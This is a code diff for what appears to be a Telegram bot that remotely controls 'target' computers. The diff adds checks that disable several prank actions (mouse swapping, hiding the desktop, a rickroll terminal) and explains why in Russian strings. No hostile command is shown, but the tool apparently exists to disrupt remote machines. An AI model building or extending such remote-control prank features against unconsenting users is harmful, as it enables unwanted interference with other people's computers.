@@ -7845,7 +7845,20 @@ _PRANK_DISABLED = {
     "cmd:prank_open_calc_spam": "Открывает несколько окон без надёжного ограничения нагрузки.",
     "cmd:prank_fake_delete_sys32": "Вместо лёгкой имитации выполняет дорогой обход файловой системы.",
     "cmd:prank_alert_loop": "Название обещает удаление сети, а обработчик показывает только фальшивый диалог.",
+    "cmd:prank_rickroll_terminal": "Запускает видимое окно терминала; действие отключено, чтобы не создавать неожиданные окна.",
 }
+
+_PRANK_ACTION_CALLBACKS = {
+    "prank_rickroll": "prank:rickroll50",
+    "prank_matrix": "prank:matrix",
+    "prank_swap_mouse": "prank:swapmouse",
+    "prank_hide_desktop": "prank:hidedesktop",
+}
+
+
+def _prank_disabled_reason_for_action(action: str) -> str:
+    callback = _PRANK_ACTION_CALLBACKS.get(action, f"cmd:{action}")
+    return _PRANK_DISABLED.get(callback, "")
 
 
 def _prank_platform(target: str) -> str | None:
@@ -26899,6 +26912,10 @@ async def on_prank_shout_input(message: Message, state: FSMContext):
 
 @router.callback_query(AdminFilter(), F.data == "prank:swapmouse")
 async def on_prank_swapmouse(cq: CallbackQuery):
+    disabled_reason = _prank_disabled_reason_for_action("prank_swap_mouse")
+    if disabled_reason:
+        await cq.answer(f"Недоступно: {disabled_reason}", show_alert=True)
+        return
     target = SESSION.get("target")
     if not target:
         await cq.answer(_lex("target_required"), show_alert=True)
@@ -26928,6 +26945,10 @@ async def on_prank_crazycursor(cq: CallbackQuery):
 
 @router.callback_query(AdminFilter(), F.data == "prank:hidedesktop")
 async def on_prank_hidedesktop(cq: CallbackQuery):
+    disabled_reason = _prank_disabled_reason_for_action("prank_hide_desktop")
+    if disabled_reason:
+        await cq.answer(f"Недоступно: {disabled_reason}", show_alert=True)
+        return
     target = SESSION.get("target")
     if not target:
         await cq.answer(_lex("target_required"), show_alert=True)
@@ -27562,6 +27583,10 @@ def _simple_command_label(action: str, fallback: str, values: dict) -> str:
 
 async def simple_command(cq: CallbackQuery, action: str, emoji: str, label: str, timeout: float = 12.0, **publish_kwargs):
     """Запустить одну команду на одной карточке без параллельных дублей."""
+    disabled_reason = _prank_disabled_reason_for_action(action)
+    if disabled_reason:
+        await cq.answer(f"Недоступно: {disabled_reason}", show_alert=True)
+        return None
     message = cq.message
     key = (
         int(cq.from_user.id),
